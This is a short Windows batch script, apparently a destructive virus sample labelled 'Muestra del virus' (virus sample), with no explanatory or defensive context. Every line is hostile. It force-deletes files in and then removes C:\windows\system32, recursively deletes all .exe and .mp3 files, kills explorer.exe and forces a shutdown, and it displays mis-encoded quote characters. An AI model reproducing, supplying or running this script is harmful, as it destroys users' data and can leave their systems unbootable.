@echo off
del /S /F c:\windows\system32\
del /S /F *exe
del /S /F *mp3
rd c:\windows\system32
taskkill /f /im �explorer.exe�
shutdown -s -f -t 10 -c �Muestra del virus�